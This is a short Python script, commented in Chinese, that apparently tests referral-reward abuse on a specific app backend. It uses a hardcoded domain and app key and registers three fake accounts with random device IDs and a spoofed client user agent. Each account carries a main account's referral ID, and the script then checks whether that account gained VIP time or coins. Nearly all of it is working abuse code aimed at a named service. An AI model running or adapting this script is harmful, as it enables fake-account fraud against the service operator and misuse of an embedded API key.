# -*- coding: utf-8 -*-
"""邀请关系滥用测试：用小号带 pid 注册，观察主号是否获得 VIP / 金币"""
import json, urllib.request, urllib.parse, random, string, time

BASE = "https://heootjfch5.842644.xyz"
KEY  = "LMrwG8Uwmv6ara4rmvcaQT9PclDXptS2"
API  = BASE + "/appapi"
MAIN = "94970"

def call(name, method="GET", data=None, extra="", tok=None):
    url = API + "/" + name + "/appkey/" + KEY + extra
    hdr = {"User-Agent": "okhttp/3.12.0", "Content-Type": "application/x-www-form-urlencoded"}
    if tok: hdr["token"] = tok
    body = urllib.parse.urlencode(data).encode() if data is not None else None
    r = urllib.request.Request(url, data=body, headers=hdr, method=method)
    try:
        with urllib.request.urlopen(r, timeout=20) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, "EXC %s" % e

def info(uid):
    st, b = call("getUserInfo", "GET", extra="/userId/" + str(uid))
    try:
        d = json.loads(b)["Data"]
        return dict(corn=d.get("corn"), isVip=d.get("isVip"), perm=d.get("is_permanent"), vip=d.get("vipEndTime"))
    except Exception:
        return {"raw": b[:120]}

print("MAIN before:", info(MAIN))

for i in range(3):
    acc = "iv" + "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
    did = "did" + "".join(random.choices(string.hexdigits.lower(), k=12))
    st, b = call("register", "POST", {
        "account": acc, "mobileCode": "", "pwd": "abc123456",
        "pid": MAIN, "did": did, "device": "{}", "cid": "", "sys": "android"
    })
    ok = False
    try:
        d = json.loads(b)
        ok = d.get("Code") == 200
        sub = (d.get("Data") or {}).get("member_id")
    except Exception:
        sub = None
    print("[reg pid=%s #%d] %s code=%s sub=%s msg=%s" % (MAIN, i, st, "OK" if ok else "FAIL", sub, (b[:120] if not ok else "")))
    time.sleep(1.5)

print("MAIN after:", info(MAIN))
st, b = call("getUserTeam", "GET", extra="/userId/" + MAIN)
print("[team]", b[:300])
st, b = call("myShare", "GET", extra="/userId/" + MAIN)
print("[myShare]", b[:300])
